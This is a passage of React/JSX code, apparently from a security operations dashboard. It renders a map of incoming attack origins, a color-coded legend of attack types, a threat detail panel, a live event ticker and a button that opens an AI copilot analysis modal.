              <div className="absolute left-6 top-1/2 -translate-y-1/2 bg-[#080d1a]/95 px-2.5 py-1 rounded-md border border-cyan-400/50 text-[10px] font-mono font-bold text-cyan-300 whitespace-nowrap shadow-xl pointer-events-none z-40 backdrop-blur-sm">
                🛡️ CASOC HUB (Ashburn, VA)
              </div>
            </div>

            {/* Ballistic Curved Attack Trajectories & Trailing Arcs */}
            <svg className="absolute inset-0 w-full h-full pointer-events-none z-10">
              {geoFeed.map((threat) => {
                const pt = projectCoords(threat.lat, threat.lon);
                const strokeColor = getThreatColor(threat.category);
                const isSelected = selectedThreat?.id === threat.id;

                // Control point calculation for dynamic ballistic curve
                const midX = (pt.x + socCenter.x) / 2;
                const midY = (pt.y + socCenter.y) / 2 - 18;

                return (
                  <g key={`arc-${threat.id}`}>
                    {/* Background glow path */}
                    <path
                      d={`M ${pt.x}% ${pt.y}% Q ${midX}% ${midY}% ${socCenter.x}% ${socCenter.y}%`}
                      fill="none"
                      stroke={strokeColor}
                      strokeWidth={isSelected ? '2.5' : '1.4'}
                      strokeDasharray="4 4"
                      className="opacity-75 transition-all"
                    />

                    {/* Animated Projectile Indicator along arc */}
                    <circle
                      cx={`${(pt.x * 0.7 + socCenter.x * 0.3)}%`}
                      cy={`${(pt.y * 0.7 + socCenter.y * 0.3 - 6)}%`}
                      r={isSelected ? '3.5' : '2'}
                      fill={strokeColor}
                      className="animate-pulse"
                    />
                  </g>
                );
              })}
            </svg>

            {/* Attacker Origin Blips (Grounded in Live Telemetry) */}
            {geoFeed.map((threat) => {
              const pt = projectCoords(threat.lat, threat.lon);
              const isSelected = selectedThreat?.id === threat.id;
              const color = getThreatColor(threat.category);

              return (
                <div
                  key={threat.id}
                  onClick={() => handleInspect(threat)}
                  className="absolute z-20 -translate-x-1/2 -translate-y-1/2 cursor-pointer group"
                  style={{ left: `${pt.x}%`, top: `${pt.y}%` }}
                >
                  <div className="relative flex items-center justify-center">
                    {/* Concentric Pulsing Halo */}
                    <span
                      className="absolute -inset-2.5 rounded-full animate-ping opacity-60"
                      style={{ backgroundColor: color }}
                    />
                    <span
                      className="absolute -inset-1 rounded-full opacity-40 animate-pulse"
                      style={{ backgroundColor: color }}
                    />

                    {/* Pin Head */}
                    <div
                      className={`rounded-full border-2 border-white shadow-xl transition-all ${
                        isSelected ? 'scale-150 ring-4 ring-cyan-400' : 'group-hover:scale-125'
                      }`}
                      style={{
                        backgroundColor: color,
                        width: isSelected ? '14px' : '10px',
                        height: isSelected ? '14px' : '10px'
                      }}
                    />

                    {/* Country Flag Badge Above Blip */}
                    <span className="absolute -top-4 text-xs pointer-events-none drop-shadow">
                      {threat.flag}
                    </span>
                  </div>

                  {/* High-Tech Hover Tooltip */}
                  <div className="hidden group-hover:block absolute bottom-6 left-1/2 -translate-x-1/2 bg-[#090e1c] border border-cyan-500/40 p-2.5 rounded-xl text-[11px] font-mono text-white whitespace-nowrap shadow-2xl z-40 backdrop-blur-md">
                    <div className="font-bold flex items-center gap-1.5 pb-1 border-b border-white/10 text-white">
                      <span>{threat.flag}</span>
                      <span>{threat.city}, {threat.country}</span>
                    </div>
                    <div className="text-gray-300 pt-1">IP: <strong className="text-white">{threat.src_ip}</strong></div>
                    <div className="text-red-400 font-bold">{threat.category}</div>
                    <div className="text-emerald-400 text-[10px]">Confidence: {threat.confidence}%</div>
                  </div>
                </div>
              );
            })}
          </div>

          {/* Color-Coded Threat Vector Legend */}
          <div className="flex flex-wrap items-center justify-between text-xs text-gray-300 pt-3 border-t border-white/10 z-10 font-mono gap-2">
            <div className="flex flex-wrap items-center gap-3.5">
              <span className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full bg-cyan-400 shadow-sm" /> CASOC Hub (Ashburn)
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full bg-[#ff0055] shadow-sm" /> DDoS / SYN Flood
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full bg-[#f97316] shadow-sm" /> SQLi / Web Attack
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full bg-[#a855f7] shadow-sm" /> PortScan Probe
              </span>
              <span className="flex items-center gap-1.5">
                <span className="w-2.5 h-2.5 rounded-full bg-[#10b981] shadow-sm" /> Botnet C2
              </span>
            </div>
            <span className="text-cyan-400/80">Click any blip to open forensic dossier</span>
          </div>
        </div>

        {/* Live Attack Feed & Threat Inspector Panel (1 Column) */}
        <div className="space-y-4 flex flex-col justify-between">
          {/* Forensic Threat Inspector Card */}
          <div className="bg-gradient-to-br from-[#0e162a] to-[#121c36] p-4 rounded-2xl border border-cyan-500/30 shadow-xl">
            <h3 className="text-xs font-bold text-cyan-400 uppercase tracking-wider mb-2.5 flex items-center gap-2">
              <Shield className="w-4 h-4 text-cyan-400" />
              Forensic Threat Origin Dossier
            </h3>

            {selectedThreat ? (
              <div className="space-y-3 text-xs">
                <div className="flex items-center justify-between pb-2 border-b border-white/10">
                  <span className="text-base font-bold text-white flex items-center gap-2">
                    <span className="text-xl">{selectedThreat.flag}</span>
                    <span>{selectedThreat.country}</span>
                  </span>
                  <span className="font-mono text-cyan-300 font-bold bg-cyan-500/10 px-2.5 py-1 rounded-md border border-cyan-500/30">
                    {selectedThreat.city}
                  </span>
                </div>

                <div className="grid grid-cols-2 gap-2 text-gray-300 font-mono">
                  <div className="bg-black/20 p-2 rounded-lg border border-white/5">
                    <span className="text-gray-500 block text-[10px]">ATTACKER IP</span>
                    <span className="text-white font-bold">{selectedThreat.src_ip}</span>
                  </div>
                  <div className="bg-black/20 p-2 rounded-lg border border-white/5">
                    <span className="text-gray-500 block text-[10px]">VECTOR</span>
                    <span className="text-red-400 font-bold truncate block">{selectedThreat.category}</span>
                  </div>
                  <div className="bg-black/20 p-2 rounded-lg border border-white/5">
                    <span className="text-gray-500 block text-[10px]">COORDINATES</span>
                    <span>{selectedThreat.lat}, {selectedThreat.lon}</span>
                  </div>
                  <div className="bg-black/20 p-2 rounded-lg border border-white/5">
                    <span className="text-gray-500 block text-[10px]">ML CONFIDENCE</span>
                    <span className="text-emerald-400 font-bold">{selectedThreat.confidence}%</span>
                  </div>
                </div>

                <div className="bg-black/20 p-2 rounded-lg border border-white/5 text-[11px] font-mono text-gray-300">
                  <span className="text-gray-500 block text-[10px]">TARGET DESTINATION</span>
                  <span className="text-cyan-300 font-bold">{selectedThreat.dst_ip || '192.168.1.50'}</span>
                </div>

                <button
                  onClick={() => handleLaunchCopilot(selectedThreat)}
                  className="w-full mt-2 py-2.5 px-3 rounded-xl bg-gradient-to-r from-cyan-500 via-blue-600 to-indigo-600 hover:from-cyan-400 hover:to-indigo-500 text-white font-bold text-xs transition-all shadow-lg shadow-cyan-500/20 flex items-center justify-center gap-2"
                >
                  <Cpu className="w-4 h-4" />
                  Analyze with AI SOC Copilot
                </button>
              </div>
            ) : (
              <div className="p-6 text-center text-gray-500 text-xs font-mono">
                Click any glowing pin on the radar map to inspect spatial coordinates.
              </div>
            )}
          </div>

          {/* Live Ingress Attack Ticker Feed */}
          <div className="bg-gradient-to-br from-[#0e162a] to-[#121c36] p-4 rounded-2xl border border-white/10 shadow-xl flex-1 flex flex-col">
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-white/10">
              <h3 className="text-xs font-bold text-gray-300 uppercase tracking-wider flex items-center gap-2">
                <Activity className="w-3.5 h-3.5 text-cyan-400" />
                Live Ingress Attack Ticker
              </h3>
              <span className="text-[10px] font-mono px-2 py-0.5 rounded-full bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                {geoFeed.length} Events
              </span>
            </div>

            <div className="flex-1 overflow-y-auto space-y-2 max-h-[220px] pr-1 font-mono text-xs">
              {geoFeed.map((item) => {
                const isSelected = selectedThreat?.id === item.id;
                const color = getThreatColor(item.category);

                return (
                  <div
                    key={item.id}
                    onClick={() => handleInspect(item)}
                    className={`p-2.5 rounded-xl border cursor-pointer flex items-center justify-between transition-all ${
                      isSelected
                        ? 'bg-cyan-950/40 border-cyan-500/50 shadow-md'
                        : 'bg-[#080d1a] hover:bg-[#0f172e] border-white/5'
                    }`}
                  >
                    <div className="flex items-center gap-2.5">
                      <span className="text-lg">{item.flag}</span>
                      <div>
                        <div className="text-white font-bold text-[11px] flex items-center gap-1.5">
                          <span>{item.src_ip}</span>
                          {item.isJustLaunched && (
                            <span className="text-[8px] bg-red-500 text-white font-black px-1 rounded animate-pulse">
                              NEW
                            </span>
                          )}
                        </div>
                        <div className="text-[10px] text-gray-400">{item.city}, {item.country}</div>
                      </div>
                    </div>

                    <div className="text-right">
                      <div className="text-[10px] font-bold truncate max-w-[120px]" style={{ color }}>
                        {item.category}
                      </div>
                      <div className="text-[9px] text-emerald-400 font-mono">{item.confidence}%</div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>
      </div>

      {/* AI Copilot Integration Modal */}
      {copilotOpen && (
        <AICopilotModal
          isOpen={copilotOpen}
          onClose={() => setCopilotOpen(false)}
          initialIncident={activeIncidentForCopilot}
        />
      )}
    </div>
  );
};
